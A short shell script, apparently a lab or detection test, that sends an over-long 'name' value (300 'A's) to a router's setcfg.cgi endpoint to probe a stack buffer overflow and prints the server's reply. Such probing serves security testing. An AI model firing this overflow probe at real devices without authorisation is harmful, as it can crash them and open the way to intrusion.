#!/bin/sh
# M4 - setcfg.cgi stack buffer overflow ("name" copied into a 64-byte buffer).
# This sends an over-long value and prints the server's own "copying N bytes" banner.
# Keep the payload benign (no crash string) for a safe detection test.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
NAME="${1:-$(printf 'A%.0s' $(seq 1 300))}"
echo "[*] GET setcfg.cgi?name=<${#NAME} bytes>"
curl -s --max-time 15 "http://$TARGET/cgi-bin/setcfg.cgi?name=$NAME"
echo
